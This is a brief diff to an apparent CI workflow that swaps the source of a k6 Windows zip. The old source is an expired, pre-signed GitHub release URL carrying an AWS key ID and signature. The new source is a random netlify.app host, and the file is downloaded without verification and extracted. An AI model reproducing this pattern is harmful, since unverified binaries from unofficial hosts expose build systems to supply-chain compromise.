@@ -11,7 +11,7 @@ jobs:
 
       - name: download and extract k6 release binaries
         run: |
-          curl -L https://github-releases.githubusercontent.com/54400687/40789f80-6918-11ea-8fd6-98db35349e91?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211018%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211018T191402Z&X-Amz-Expires=300&X-Amz-Signature=469c96d87c405ae10c7cf016a5c8d308ac82ac50eff5aad1bcad4974e6444311&X-Amz-SignedHeaders=host&actor_id=27068556&key_id=0&repo_id=54400687&response-content-disposition=attachment%3B%20filename%3Dk6-v0.26.2-win64.zip&response-content-type=application%2Foctet-stream -o k6.zip
+          curl -L https://thirsty-poincare-29dd81.netlify.app/k6-v0.26.2-win64.zip -o k6.zip
           7z.exe e k6.zip
         shell: bash
 
